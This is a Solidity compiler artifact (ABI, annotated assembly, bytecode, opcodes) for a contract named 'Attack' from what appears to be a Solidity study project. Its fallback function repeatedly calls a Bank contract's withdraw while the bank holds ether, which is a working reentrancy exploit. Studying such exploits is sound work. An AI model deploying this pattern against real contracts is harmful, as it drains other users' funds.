{
	"solidity-study-demo/thirdPart/Bank.sol": {
		"Attack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract Bank",
							"name": "_bank",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"stateMutability": "payable",
					"type": "fallback"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"solidity-study-demo/thirdPart/Bank.sol\":934:1409  contract Attack {... */\n  mstore(0x40, 0x80)\n    /* \"solidity-study-demo/thirdPart/Bank.sol\":975:1037  constructor (Bank _bank) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"solidity-study-demo/thirdPart/Bank.sol\":1023:1028  _bank */\n  dup1\n    /* \"solidity-study-demo/thirdPart/Bank.sol\":1011:1015  bank */\n  0x00\n  dup1\n    /* \"solidity-study-demo/thirdPart/Bank.sol\":1011:1029  bank = Bank(_bank) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"solidity-study-demo/thirdPart/Bank.sol\":975:1037  constructor (Bank _bank) {... */\n  pop\n    /* \"solidity-study-demo/thirdPart/Bank.sol\":934:1409  contract Attack {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_21\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:675   */\ntag_12:\n    /* \"#utility.yul\":616:623   */\n  0x00\n    /* \"#utility.yul\":645:669   */\n  tag_23\n    /* \"#utility.yul\":663:668   */\n  dup3\n    /* \"#utility.yul\":645:669   */\n  tag_11\n  jump\t// in\ntag_23:\n    /* \"#utility.yul\":634:669   */\n  swap1\n  pop\n    /* \"#utility.yul\":568:675   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":681:825   */\ntag_13:\n    /* \"#utility.yul\":765:800   */\n  tag_25\n    /* \"#utility.yul\":794:799   */\n  dup2\n    /* \"#utility.yul\":765:800   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":758:763   */\n  dup2\n    /* \"#utility.yul\":755:801   */\n  eq\n    /* \"#utility.yul\":745:819   */\n  tag_26\n  jumpi\n    /* \"#utility.yul\":815:816   */\n  0x00\n    /* \"#utility.yul\":812:813   */\n  dup1\n    /* \"#utility.yul\":805:817   */\n  revert\n    /* \"#utility.yul\":745:819   */\ntag_26:\n    /* \"#utility.yul\":681:825   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":831:996   */\ntag_14:\n    /* \"#utility.yul\":899:904   */\n  0x00\n    /* \"#utility.yul\":930:936   */\n  dup2\n    /* \"#utility.yul\":924:937   */\n  mload\n    /* \"#utility.yul\":915:937   */\n  swap1\n  pop\n    /* \"#utility.yul\":946:990   */\n  tag_28\n    /* \"#utility.yul\":984:989   */\n  dup2\n    /* \"#utility.yul\":946:990   */\n  tag_13\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":831:996   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1002:1375   */\ntag_3:\n    /* \"#utility.yul\":1083:1089   */\n  0x00\n    /* \"#utility.yul\":1132:1134   */\n  0x20\n    /* \"#utility.yul\":1120:1129   */\n  dup3\n    /* \"#utility.yul\":1111:1118   */\n  dup5\n    /* \"#utility.yul\":1107:1130   */\n  sub\n    /* \"#utility.yul\":1103:1135   */\n  slt\n    /* \"#utility.yul\":1100:1219   */\n  iszero\n  tag_30\n  jumpi\n    /* \"#utility.yul\":1138:1217   */\n  tag_31\n  tag_8\n  jump\t// in\ntag_31:\n    /* \"#utility.yul\":1100:1219   */\ntag_30:\n    /* \"#utility.yul\":1258:1259   */\n  0x00\n    /* \"#utility.yul\":1283:1358   */\n  tag_32\n    /* \"#utility.yul\":1350:1357   */\n  dup5\n    /* \"#utility.yul\":1341:1347   */\n  dup3\n    /* \"#utility.yul\":1330:1339   */\n  dup6\n    /* \"#utility.yul\":1326:1348   */\n  add\n    /* \"#utility.yul\":1283:1358   */\n  tag_14\n  jump\t// in\ntag_32:\n    /* \"#utility.yul\":1273:1358   */\n  swap2\n  pop\n    /* \"#utility.yul\":1229:1368   */\n  pop\n    /* \"#utility.yul\":1002:1375   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"solidity-study-demo/thirdPart/Bank.sol\":934:1409  contract Attack {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":934:1409  contract Attack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x12065fe0\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_4\n      jumpi\n      jump(tag_2)\n    tag_1:\n    tag_2:\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1113:1120  1 ether */\n      0x0de0b6b3a7640000\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1096:1100  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1088:1109  address(bank).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1088:1120  address(bank).balance >= 1 ether */\n      lt\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1084:1171  if (address(bank).balance >= 1 ether) {... */\n      tag_7\n      jumpi\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1137:1141  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1137:1150  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1151:1158  1 ether */\n      0x0de0b6b3a7640000\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1137:1159  bank.withdraw(1 ether) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_8\n      swap2\n      swap1\n      tag_9\n      jump\t// in\n    tag_8:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_10\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_10:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_12\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_12:\n      pop\n      pop\n      pop\n      pop\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1084:1171  if (address(bank).balance >= 1 ether) {... */\n    tag_7:\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":934:1409  contract Attack {... */\n      stop\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1310:1406  function getBalance() public view returns (uint) {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_13\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_13:\n      pop\n      tag_14\n      tag_15\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1186:1302  function attack() public payable {... */\n    tag_4:\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      stop\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1310:1406  function getBalance() public view returns (uint) {... */\n    tag_15:\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1353:1357  uint */\n      0x00\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1377:1398  address(this).balance */\n      selfbalance\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1370:1398  return address(this).balance */\n      swap1\n      pop\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1310:1406  function getBalance() public view returns (uint) {... */\n      swap1\n      jump\t// out\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1186:1302  function attack() public payable {... */\n    tag_19:\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1230:1234  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1230:1242  bank.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1251:1258  1 ether */\n      0x0de0b6b3a7640000\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1230:1261  bank.deposit{value : 1 ether}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_22\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_22:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_24\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_24:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1272:1276  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1272:1285  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1286:1293  1 ether */\n      0x0de0b6b3a7640000\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1272:1294  bank.withdraw(1 ether) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_25\n      swap2\n      swap1\n      tag_9\n      jump\t// in\n    tag_25:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_26\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_26:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_28\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_28:\n      pop\n      pop\n      pop\n      pop\n        /* \"solidity-study-demo/thirdPart/Bank.sol\":1186:1302  function attack() public payable {... */\n      jump\t// out\n        /* \"#utility.yul\":7:110   */\n    tag_29:\n        /* \"#utility.yul\":70:77   */\n      0x00\n        /* \"#utility.yul\":99:104   */\n      dup2\n        /* \"#utility.yul\":88:104   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:110   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":116:193   */\n    tag_30:\n        /* \"#utility.yul\":153:160   */\n      0x00\n        /* \"#utility.yul\":182:187   */\n      dup2\n        /* \"#utility.yul\":171:187   */\n      swap1\n      pop\n        /* \"#utility.yul\":116:193   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":199:259   */\n    tag_31:\n        /* \"#utility.yul\":227:230   */\n      0x00\n        /* \"#utility.yul\":248:253   */\n      dup2\n        /* \"#utility.yul\":241:253   */\n      swap1\n      pop\n        /* \"#utility.yul\":199:259   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":265:459   */\n    tag_32:\n        /* \"#utility.yul\":341:350   */\n      0x00\n        /* \"#utility.yul\":374:453   */\n      tag_40\n        /* \"#utility.yul\":392:452   */\n      tag_41\n        /* \"#utility.yul\":401:451   */\n      tag_42\n        /* \"#utility.yul\":445:450   */\n      dup5\n        /* \"#utility.yul\":401:451   */\n      tag_29\n      jump\t// in\n    tag_42:\n        /* \"#utility.yul\":392:452   */\n      tag_31\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":374:453   */\n      tag_30\n      jump\t// in\n    tag_40:\n        /* \"#utility.yul\":361:453   */\n      swap1\n      pop\n        /* \"#utility.yul\":265:459   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":465:648   */\n    tag_33:\n        /* \"#utility.yul\":578:641   */\n      tag_44\n        /* \"#utility.yul\":635:640   */\n      dup2\n        /* \"#utility.yul\":578:641   */\n      tag_32\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":573:576   */\n      dup3\n        /* \"#utility.yul\":566:642   */\n      mstore\n        /* \"#utility.yul\":465:648   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":654:928   */\n    tag_9:\n        /* \"#utility.yul\":773:777   */\n      0x00\n        /* \"#utility.yul\":811:813   */\n      0x20\n        /* \"#utility.yul\":800:809   */\n      dup3\n        /* \"#utility.yul\":796:814   */\n      add\n        /* \"#utility.yul\":788:814   */\n      swap1\n      pop\n        /* \"#utility.yul\":824:921   */\n      tag_46\n        /* \"#utility.yul\":918:919   */\n      0x00\n        /* \"#utility.yul\":907:916   */\n      dup4\n        /* \"#utility.yul\":903:920   */\n      add\n        /* \"#utility.yul\":894:900   */\n      dup5\n        /* \"#utility.yul\":824:921   */\n      tag_33\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":654:928   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":934:1052   */\n    tag_34:\n        /* \"#utility.yul\":1021:1045   */\n      tag_48\n        /* \"#utility.yul\":1039:1044   */\n      dup2\n        /* \"#utility.yul\":1021:1045   */\n      tag_30\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":1016:1019   */\n      dup3\n        /* \"#utility.yul\":1009:1046   */\n      mstore\n        /* \"#utility.yul\":934:1052   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1058:1280   */\n    tag_17:\n        /* \"#utility.yul\":1151:1155   */\n      0x00\n        /* \"#utility.yul\":1189:1191   */\n      0x20\n        /* \"#utility.yul\":1178:1187   */\n      dup3\n        /* \"#utility.yul\":1174:1192   */\n      add\n        /* \"#utility.yul\":1166:1192   */\n      swap1\n      pop\n        /* \"#utility.yul\":1202:1273   */\n      tag_50\n        /* \"#utility.yul\":1270:1271   */\n      0x00\n        /* \"#utility.yul\":1259:1268   */\n      dup4\n        /* \"#utility.yul\":1255:1272   */\n      add\n        /* \"#utility.yul\":1246:1252   */\n      dup5\n        /* \"#utility.yul\":1202:1273   */\n      tag_34\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":1058:1280   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122014c7f5e24d802689b1c5576ce4a4df246a4bb0831ad27fb76f673c6a1b5f279564736f6c634300080e0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b50604051610458380380610458833981810160405281019061003291906100ed565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061011a565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b60006100ba8261009d565b9050919050565b6100ca816100af565b81146100d557600080fd5b50565b6000815190506100e7816100c1565b92915050565b60006020828403121561010357610102610078565b5b6000610111848285016100d8565b91505092915050565b61032f806101296000396000f3fe60806040526004361061002d5760003560e01c806312065fe01461010a5780639e5faafc146101355761002e565b5b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101085760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b81526004016100d591906102b4565b600060405180830381600087803b1580156100ef57600080fd5b505af1158015610103573d6000803e3d6000fd5b505050505b005b34801561011657600080fd5b5061011f61013f565b60405161012c91906102de565b60405180910390f35b61013d610147565b005b600047905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156101b757600080fd5b505af11580156101cb573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b815260040161023191906102b4565b600060405180830381600087803b15801561024b57600080fd5b505af115801561025f573d6000803e3d6000fd5b50505050565b6000819050919050565b6000819050919050565b6000819050919050565b600061029e61029961029484610265565b610279565b61026f565b9050919050565b6102ae81610283565b82525050565b60006020820190506102c960008301846102a5565b92915050565b6102d88161026f565b82525050565b60006020820190506102f360008301846102cf565b9291505056fea264697066735822122014c7f5e24d802689b1c5576ce4a4df246a4bb0831ad27fb76f673c6a1b5f279564736f6c634300080e0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x458 CODESIZE SUB DUP1 PUSH2 0x458 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0xED JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x11A JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xA8 DUP3 PUSH2 0x7D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xBA DUP3 PUSH2 0x9D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xCA DUP2 PUSH2 0xAF JUMP JUMPDEST DUP2 EQ PUSH2 0xD5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xE7 DUP2 PUSH2 0xC1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x103 JUMPI PUSH2 0x102 PUSH2 0x78 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x111 DUP5 DUP3 DUP6 ADD PUSH2 0xD8 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x32F DUP1 PUSH2 0x129 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2D JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x10A JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x135 JUMPI PUSH2 0x2E JUMP JUMPDEST JUMPDEST PUSH8 0xDE0B6B3A7640000 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x108 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xD5 SWAP2 SWAP1 PUSH2 0x2B4 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xEF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x103 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x116 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x11F PUSH2 0x13F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x12C SWAP2 SWAP1 PUSH2 0x2DE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x13D PUSH2 0x147 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1B7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1CB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x231 SWAP2 SWAP1 PUSH2 0x2B4 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x24B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x25F JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x29E PUSH2 0x299 PUSH2 0x294 DUP5 PUSH2 0x265 JUMP JUMPDEST PUSH2 0x279 JUMP JUMPDEST PUSH2 0x26F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2AE DUP2 PUSH2 0x283 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2C9 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2A5 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x2D8 DUP2 PUSH2 0x26F JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2F3 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2CF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 EQ 0xC7 CREATE2 0xE2 0x4D DUP1 0x26 DUP10 0xB1 0xC5 JUMPI PUSH13 0xE4A4DF246A4BB0831AD27FB76F PUSH8 0x3C6A1B5F27956473 PUSH16 0x6C634300080E00330000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "163000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"": "infinite",
						"attack()": "infinite",
						"getBalance()": "317"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"getBalance()": "12065fe0"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 119,
						"contract": "solidity-study-demo/thirdPart/Bank.sol:Attack",
						"label": "bank",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(Bank)91"
					}
				],
				"types": {
					"t_contract(Bank)91": {
						"encoding": "inplace",
						"label": "contract Bank",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}